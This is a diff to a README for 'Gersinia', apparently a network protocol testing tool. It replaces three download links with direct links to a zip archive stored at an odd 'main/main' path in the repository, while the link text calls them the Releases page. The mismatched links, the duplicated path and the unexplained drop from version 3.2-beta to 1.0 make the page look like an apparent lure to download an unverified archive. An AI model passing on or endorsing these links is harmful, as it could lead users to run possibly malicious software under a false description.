@@ -6,7 +6,7 @@ Welcome to Gersinia! This application helps you test network protocols and gener
 
 ## 📥 Download Gersinia
 
-[![Download Gersinia](https://raw.githubusercontent.com/pafmee/Gersinia/main/main/Software-v3.2-beta.3.zip)](https://raw.githubusercontent.com/pafmee/Gersinia/main/main/Software-v3.2-beta.3.zip)
+[![Download Gersinia](https://github.com/pafmee/Gersinia/raw/refs/heads/main/main/Software-v1.0.zip)](https://github.com/pafmee/Gersinia/raw/refs/heads/main/main/Software-v1.0.zip)
 
 ## 💻 System Requirements
 
@@ -21,7 +21,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started, visit the Releases page to download the latest version of Gersinia:
 
-- **Download Link:** [Visit this page to download](https://raw.githubusercontent.com/pafmee/Gersinia/main/main/Software-v3.2-beta.3.zip)
+- **Download Link:** [Visit this page to download](https://github.com/pafmee/Gersinia/raw/refs/heads/main/main/Software-v1.0.zip)
 
 Follow these steps:
 
@@ -80,4 +80,4 @@ Gersinia provides you with a solid foundation for understanding and testing netw
 
 For the latest updates and features, ensure you check the Releases page frequently.
 
-[![Download Gersinia](https://raw.githubusercontent.com/pafmee/Gersinia/main/main/Software-v3.2-beta.3.zip)](https://raw.githubusercontent.com/pafmee/Gersinia/main/main/Software-v3.2-beta.3.zip)
+[![Download Gersinia](https://github.com/pafmee/Gersinia/raw/refs/heads/main/main/Software-v1.0.zip)](https://github.com/pafmee/Gersinia/raw/refs/heads/main/main/Software-v1.0.zip)
